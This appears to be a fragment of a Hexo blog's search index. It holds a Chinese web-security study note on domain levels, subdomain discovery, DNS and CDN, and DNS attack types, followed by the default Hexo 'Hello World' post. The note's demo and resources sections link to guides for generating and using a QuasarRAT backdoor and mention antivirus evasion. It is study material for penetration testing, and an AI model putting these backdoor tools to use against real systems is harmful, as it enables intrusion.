id="3、什么是子域名、二级域名、多级域名？"><a href="#3、什么是子域名、二级域名、多级域名？" class="headerlink" title="3、什么是子域名、二级域名、多级域名？"></a><font size="4"><strong>3、什么是子域名、二级域名、多级域名？</strong></font></h4><p>例如<a href="http://www.dns0755.net是dns0755.net的子域名,而dns0755.net又是net的子域名.国际顶级域名的子域名叫做二级域名./">www.dns0755.net是dns0755.net的子域名，而dns0755.net又是net的子域名。国际顶级域名的子域名叫做二级域名。</a></p><p>如A.com是一级域名，A.B.com则是二级域名。一级域名较二级域名级别更高，而二级域名则是依附于一级域名下的附属分区域名，即二级域名是一级域名的细分层级。</p><p>通过网址上【.】数量来判断域名层级，有多少【.】就为几级域名，如A.com是一级域名，A.B.com则是二级域名。</p><p>如：baidu.com 是百度的顶级域名，zhidao.baidu.com 是二级域名，zhidao.zhidao.baidu.com 是三（多）级域名，*.baidu.com 是泛域名。</p><h4 id="4、域名发现对于安全测试意义？"><a href="#4、域名发现对于安全测试意义？" class="headerlink" title="4、域名发现对于安全测试意义？"></a><font size="4"><strong>4、域名发现对于安全测试意义？</strong></font></h4><p>进行渗透测试时，其主域名找不到漏洞时，就可以尝试去测试收集到的子域名，有可能测试子域名网站时会有意向不到的效果，然后可以由此横向到主网站。</p><h3 id="二、DNS与CDN"><a href="#二、DNS与CDN" class="headerlink" title="二、DNS与CDN"></a><font size="5"><strong>二、DNS与CDN</strong></font></h3><h4 id="1、什么是DNS？"><a href="#1、什么是DNS？" class="headerlink" title="1、什么是DNS？"></a><font size="4"><strong>1、什么是DNS？</strong></font></h4><p>域名系统（英文：Domain Name System，缩写：DNS）是互联网的一项服务。它作为将域名和IP地址相互映射的一个分布式数据库，能够使人更方便地访问互联网。DNS使用TCP和UDP端口53。当前，对于每一级域名长度的限制是63个字符，域名总长度则不能超过253个字符。</p><h4 id="2、本地HOSTS与DNS的关系？"><a href="#2、本地HOSTS与DNS的关系？" class="headerlink" title="2、本地HOSTS与DNS的关系？"></a><font size="4"><strong>2、本地HOSTS与DNS的关系？</strong></font></h4><p>Hosts是一个没有扩展名的系统文件，可以用记事本等工具打开，其作用就是将一些常用的网址域名与其对应的IP地址建立一个关联“数据库”，当用户在浏览器中输入一个需要登录的网址时，系统会首先自动从Hosts文件中寻找对应的IP地址，一旦找到，系统会立即打开对应网页，如果没有找到，则系统会再将网址提交DNS域名解析服务器进行IP地址的解析。</p><p>需要注意的是，Hosts文件配置的映射是静态的，如果网络上的计算机更改了请及时更新IP地址，否则将不能访问。</p><p>例：先打开cmd终端，输入命令 ping <a href="http://www.baidu.com，得到的结果如下图：">www.baidu.com，得到的结果如下图：</a></p><p><img src="/2023/09/14/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-001/1.png"></p><p>在hosts文件（图中黄色框内为hosts文件绝对路径）最后加上下图红色框内的内容，并ctrl+s保存<br><img src="/2023/09/14/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-001/2.png"></p><p>再次ping <a href="http://www.baidu.com/">www.baidu.com</a> 时会发现解析的ip变为你hosts文件中的了（当然了，访问不了）。<br><img src="/2023/09/14/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-001/3.png"></p><h4 id="3、CDN是什么？与DNS的关系？"><a href="#3、CDN是什么？与DNS的关系？" class="headerlink" title="3、CDN是什么？与DNS的关系？"></a><font size="4"><strong>3、CDN是什么？与DNS的关系？</strong></font></h4><p>CDN的全称是Content Delivery Network，即内容分发网络。CDN的基本思路是尽可能避开互联网上有可能影响数据传输速度和稳定性的瓶颈和环节，使内容传输的更快、更稳定。通过在网络各处放置节点服务器所构成的在现有的互联网基础之上的一层智能虚拟网络，CDN系统能够实时地根据网络流量和各节点的连接、负载状况以及到用户的距离和响应时间等综合信息将用户的请求重新导向离用户最近的服务节点上（单纯只使用DNS解析，直接PING就会显示出自己的真实IP,如果又使用CDN，PING出来的IP就不是用户的真实IP而是CDN服务器的IP节点。需要绕过CDN后去找真实IP地址：拓展：判断是否存在CDN并绕过，寻找真实IP）。其目的是使用户可就近取得所需内容，解决 Internet网络拥挤的状况，提高用户访问网站的响应速度。<br><img src="/2023/09/14/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-001/4.png"><br>扩展：DNS和CDN的区别与联系<a href="https://www.dns.com/supports/710.html">https://www.dns.com/supports/710.html</a></p><h4 id="4、常见的DNS安全攻击有哪些？"><a href="#4、常见的DNS安全攻击有哪些？" class="headerlink" title="4、常见的DNS安全攻击有哪些？"></a><font size="4"><strong>4、常见的DNS安全攻击有哪些？</strong></font></h4><p><strong>缓存投毒</strong><br>通常也称为域名系统投毒或DNS缓存投毒。它是利用虚假Internet地址替换掉域名系统表中的地址，进而制造破坏。当网络用户在带有该虚假地址的页面中进行搜寻，以访问某链接时，网页浏览器由于受到该虚假条目的影响而打开了不同的网页链接。在这种情况下，蠕虫、木马、浏览器劫持等恶意软件就可能会被下载到本地用户的电脑上。</p><p><font size="3"><strong>DNS劫持</strong></font><br>DNS劫持又称域名劫持，是指在劫持的网络范围内拦截域名解析的请求，分析请求的域名，把审查范围以外的请求放行，否则返回假的IP地址或者什么都不做使请求失去响应，其效果就是对特定的网络不能访问或访问的是假网址。这类攻击一般通过恶意软件来更改终端用户TCP&#x2F;IP设置，将用户指向恶意DNS服务器，该DNS服务器会对域名进行解析，并最终指向钓鱼网站等被攻击者操控的服务器。</p><p><font size="3"><strong>域名劫持</strong></font><br>域名劫持就是在劫持的网络范围内拦截域名解析的请求，分析请求的域名，把审查范围以外的请求放行，否则直接返回假的IP地址或者什么也不做使得请求失去响应，其效果就是对特定的网址不能访问或访问的是假网址。一旦您的域名被劫持，用户被引到假冒的网站进而无法正常浏览网页，用户可能被诱骗到冒牌网站进行登录等操作导致泄露隐私数据。</p><p><font size="3"><strong>DNS DDoS攻击</strong></font><br>针对DNS的DDoS攻击通过控制大批僵尸网络利用真实DNS协议栈发起大量域名查询请求，利用工具软件伪造源IP发送海量DNS查询，发送海量DNS查询报文导致网络带宽耗尽而无法传送正常DNS查询请求。发送大量非法域名查询报文引起DNS服务器持续进行迭代查询，从而达到较少的攻击流量消耗大量服务器资源的目的。</p><p><font size="3"><strong>反射式DNS放大攻击</strong></font><br>所有放大攻击都利用了攻击者和目标Web资源之间的带宽消耗差异，由于每个机器人都要求使用欺骗性IP地址打开DNS解析器，该IP地址已更改为目标受害者的真实源IP地址，然后目标会从DNS解析器接收响应。为了创建大量流量，攻击者以尽可能从DNS解析器生成响应的方式构造请求。结果，目标接收到攻击者初始流量的放大，并且他们的网络被虚假流量阻塞，导致拒绝服务。</p><p>当面对各种DNS攻击，墨者安全建议专业的高防DNS防劫持服务，保障服务器的稳定运行，从容应对各种DNS攻击，避免因DNS攻击造成在线业务中断，给企业带来重大损失。</p><h3 id="三、脚本语言"><a href="#三、脚本语言" class="headerlink" title="三、脚本语言"></a><font size="5"><strong>三、脚本语言</strong></font></h3><h4 id="1、常见的脚本语言类型有哪些？"><a href="#1、常见的脚本语言类型有哪些？" class="headerlink" title="1、常见的脚本语言类型有哪些？"></a><font size="4"><strong>1、常见的脚本语言类型有哪些？</strong></font></h4><p>asp php aspx jsp javaweb pl py cgi等</p><h4 id="2、不同脚本类型与安全漏洞的关系？"><a href="#2、不同脚本类型与安全漏洞的关系？" class="headerlink" title="2、不同脚本类型与安全漏洞的关系？"></a><font size="4"><strong>2、不同脚本类型与安全漏洞的关系？</strong></font></h4><p>不同的脚本语言的编写规则不一样，程序产生的漏洞自然也不一样（代码审计）。</p><h4 id="3、漏洞挖掘代码审计与脚本类型的关系？"><a href="#3、漏洞挖掘代码审计与脚本类型的关系？" class="headerlink" title="3、漏洞挖掘代码审计与脚本类型的关系？"></a><font size="4"><strong>3、漏洞挖掘代码审计与脚本类型的关系？</strong></font></h4><p>同上</p><h3 id="四、后门"><a href="#四、后门" class="headerlink" title="四、后门"></a><font size="5"><strong>四、后门</strong></font></h3><h4 id="1、什么是后门？有那些后门？"><a href="#1、什么是后门？有那些后门？" class="headerlink" title="1、什么是后门？有那些后门？"></a><font size="4"><strong>1、什么是后门？有那些后门？</strong></font></h4><p>后门程序一般是指那些绕过安全性控制而获取对程序或系统访问权的程序方法。类别：网页、线程插入、扩展、C&#x2F;S后门。</p><h4 id="2、后门在安全测试中的实际意义？"><a href="#2、后门在安全测试中的实际意义？" class="headerlink" title="2、后门在安全测试中的实际意义？"></a><font size="4"><strong>2、后门在安全测试中的实际意义？</strong></font></h4><p>例如后门藏在网页上、软件内，悄无声息的进行攻击者想要的操作。</p><h4 id="3、关于后门需要了解那些？（玩法，免杀）"><a href="#3、关于后门需要了解那些？（玩法，免杀）" class="headerlink" title="3、关于后门需要了解那些？（玩法，免杀）"></a><font size="4"><strong>3、关于后门需要了解那些？（玩法，免杀）</strong></font></h4><p>免杀，简单来讲就是绕过杀毒软件等。</p><h3 id="五、WEB"><a href="#五、WEB" class="headerlink" title="五、WEB"></a><font size="5"><strong>五、WEB</strong></font></h3><h4 id="1、WEB的组成架构模型？"><a href="#1、WEB的组成架构模型？" class="headerlink" title="1、WEB的组成架构模型？"></a><font size="4"><strong>1、WEB的组成架构模型？</strong></font></h4><p>网站源码：分脚本类型，分应用方向<br>操作系统：windows linux<br>中间件（搭建平台）：apache iis tomcat nginx等<br>数据库：access mysql mssql oracle sybase db2 postsql等</p><h4 id="2、架构漏洞安全测试简要介绍？"><a href="#2、架构漏洞安全测试简要介绍？" class="headerlink" title="2、架构漏洞安全测试简要介绍？"></a><font size="4"><strong>2、架构漏洞安全测试简要介绍？</strong></font></h4><h4 id="3、为什么要从WEB层面为主为首？"><a href="#3、为什么要从WEB层面为主为首？" class="headerlink" title="3、为什么要从WEB层面为主为首？"></a><font size="4"><strong>3、为什么要从WEB层面为主为首？</strong></font></h4><p>用户接触web层面最多，大部分都是从web页面入手慢慢渗透到服务器。直接从操作系统入手不太现实（大部分情况下接触不到）。</p><h3 id="六、WEB相关安全漏洞"><a href="#六、WEB相关安全漏洞" class="headerlink" title="六、WEB相关安全漏洞"></a><font size="5"><strong>六、WEB相关安全漏洞</strong></font></h3><p>● WEB源码类对应漏洞<br>SQL注入，文件上传，XSS，代码执行，变量覆盖，逻辑漏洞，反序列化等</p><p>● WEB中间件对应漏洞<br>未授权访问</p><p>● WEB数据库对应漏洞<br>内核漏洞</p><p>● WEB系统层对应漏洞<br>远程代码执行，提权</p><p>● 其他第三方对应漏洞<br>第三方软件漏洞</p><p>● APP或PC应用结合类</p><p>● owasp top10</p><h3 id="七、演示案例"><a href="#七、演示案例" class="headerlink" title="七、演示案例"></a><font size="5"><strong>七、演示案例</strong></font></h3><h4 id="1、多级域名的枚举查找（原理，方式）"><a href="#1、多级域名的枚举查找（原理，方式）" class="headerlink" title="1、多级域名的枚举查找（原理，方式）"></a><font size="4"><strong>1、多级域名的枚举查找（原理，方式）</strong></font></h4><p>layer子域名挖掘机、Maltego（kali自带）、各类挖掘子域名的网站：如 <a href="https://www.t1h2ua.cn/tools/">https://www.t1h2ua.cn/tools/</a></p><h4 id="2、DNS解析修改后分析（本地或服务）"><a href="#2、DNS解析修改后分析（本地或服务）" class="headerlink" title="2、DNS解析修改后分析（本地或服务）"></a><font size="4"><strong>2、DNS解析修改后分析（本地或服务）</strong></font></h4><p>把自己电脑的DNS服务的改成手动获取，并换dns（比如先8.8.8.8，再114.114.114.114），分别ping同一网站，看解析出来的ip是否不同。</p><h4 id="3、EXE后门功能及危害及类似WEB后门"><a href="#3、EXE后门功能及危害及类似WEB后门" class="headerlink" title="3、EXE后门功能及危害及类似WEB后门"></a><font size="4"><strong>3、EXE后门功能及危害及类似WEB后门</strong></font></h4><p>Quasar后门程序（.exe）生成并使用：<a href="https://blog.csdn.net/qq_44930903/article/details/111600982">https://blog.csdn.net/qq_44930903/article/details/111600982</a><br>web后门：beef、WSExploer抓包、wireshark抓包等</p><h4 id="4、APP类结合WEB协议，PC类结合WEB协议"><a href="#4、APP类结合WEB协议，PC类结合WEB协议" class="headerlink" title="4、APP类结合WEB协议，PC类结合WEB协议"></a><font size="4"><strong>4、APP类结合WEB协议，PC类结合WEB协议</strong></font></h4><p>Burp Suite抓app的包，然后改包发送等；<br>Apk数据提取（安卓逆向工具）：下载下方资源、解压，然后把一个apk文件放入到apps文件夹，运行exe文件，之后会生成results文件，apk的数据就在这里。</p><h3 id="八、涉及资源"><a href="#八、涉及资源" class="headerlink" title="八、涉及资源"></a><font size="5"><strong>八、涉及资源</strong></font></h3><p>● 逍遥模拟器：<a href="http://www.xyaz.cn/">http://www.xyaz.cn</a><br>● WSExplorer抓包工具：<a href="http://www.downcc.com/soft/11196.html">http://www.downcc.com/soft/11196.html</a><br>● Quasar后门程序生成：<a href="https://github.com/quasar/QuasarRAT/releases">https://github.com/quasar/QuasarRAT/releases</a><br>● Apk数据提取：<a href="https://github.com/TheKingOfDuck/ApkAnalyser">https://github.com/TheKingOfDuck/ApkAnalyser</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2023/09/13/hello-world/"/>
      <url>/2023/09/13/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class=" language-bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class=" language-bash"><code class="language-bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class=" language-bash"><code class="language-bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class=" language-bash"><code class="language-bash">$ hexo deploy</code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
